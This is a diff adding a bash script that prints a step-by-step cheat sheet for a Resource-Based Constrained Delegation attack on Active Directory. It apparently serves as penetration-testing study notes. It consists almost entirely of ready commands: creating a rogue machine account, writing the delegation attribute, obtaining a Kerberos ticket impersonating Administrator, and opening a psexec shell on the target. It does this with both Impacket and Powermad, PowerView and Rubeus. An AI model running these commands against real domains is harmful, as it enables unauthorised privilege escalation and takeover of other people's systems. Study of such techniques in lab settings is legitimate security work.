@@ -1,0 +1,49 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── RBCD — RESOURCE-BASED CONSTRAINED DELEGATION ─────${NC}"
+printf "\n"
+
+echo -e "  Note: Pre-condition: GenericWrite / GenericAll / WriteDACL on a computer object."
+echo -e "  Note: Also works when you have Write on msDS-AllowedToActOnBehalfOfOtherIdentity."
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Check Machine Account Quota ──────────────────────${NC}"
+echo -e "  ${GREEN}Get-DomainObject -Identity <DOMAIN> -Properties ms-DS-MachineAccountQuota${NC}"
+printf "\n"
+echo -e "  Note: Default is 10 — lets you create computer accounts if you have a domain user."
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── From Kali (Impacket) ─────────────────────────────${NC}"
+printf "\n"
+echo -e "  Note: 1. Create a fake computer account:"
+echo -e "  ${GREEN}impacket-addcomputer -computer-name 'myComputer\$' -computer-pass 'h4x' corp.com/mary -hashes :<HASH>${NC}"
+printf "\n"
+echo -e "  Note: 2. Set RBCD — allow myComputer\$ to impersonate users on BACKUP01\$:"
+echo -e "  ${GREEN}impacket-rbcd -action write -delegate-to 'BACKUP01\$' -delegate-from 'myComputer\$' corp.com/mary -hashes :<HASH>${NC}"
+printf "\n"
+echo -e "  Note: 3. Get Service Ticket impersonating Administrator:"
+echo -e "  ${GREEN}impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer\$:h4x'${NC}"
+printf "\n"
+echo -e "  Note: 4. Use the ticket:"
+echo -e "  ${GREEN}export KRB5CCNAME=administrator.ccache${NC}"
+echo -e "  ${GREEN}impacket-psexec administrator@backup01.corp.com -k -no-pass${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── From Windows (Powermad + PowerView) ──────────────${NC}"
+echo -e "  ${GREEN}New-MachineAccount -MachineAccount myComputer -Password \$(ConvertTo-SecureString 'h4x' -AsPlainText -Force)${NC}"
+echo -e "  ${GREEN}\$SID = Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid${NC}"
+echo -e "  ${GREEN}\$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;\$(\$SID))\"${NC}"
+echo -e "  ${GREEN}\$SDbytes = New-Object byte[] (\$SD.BinaryLength); \$SD.GetBinaryForm(\$SDbytes, 0)${NC}"
+echo -e "  ${GREEN}Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=\$SDbytes}${NC}"
+echo -e "  ${GREEN}.\\Rubeus.exe s4u /user:myComputer\$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:CIFS/appsrv01.corp.com /ptt${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
